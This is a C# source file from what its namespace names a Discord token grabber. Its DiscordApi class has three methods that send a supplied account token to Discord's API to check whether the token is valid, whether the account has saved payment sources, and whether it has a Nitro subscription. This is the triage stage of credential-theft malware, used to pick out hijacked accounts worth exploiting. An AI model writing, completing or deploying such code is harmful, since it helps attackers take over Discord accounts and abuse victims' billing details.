using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace ChillDiscordGrabber
{
    class DiscordApi
    {
        public static bool IsTokenValid(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me");
                    return !result.Contains("Unauthorized");
                }
            }
            catch { }
            return false;
        }

        public static bool HasBilling(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me/billing/payment-sources");
                    return result.Contains("type");
                }
            }
            catch { }
            return false;
        }

        public static bool HasNitro(string token)
        {
            try
            {
                using (WebClient http = new WebClient())
                {
                    http.Headers.Add("Authorization", token);
                    string result = http.DownloadString("https://discordapp.com/api/v6/users/@me/billing/subscriptions");
                    return result.Contains("created_at");
                }
            }
            catch { }
            return false;
        }
    }
}
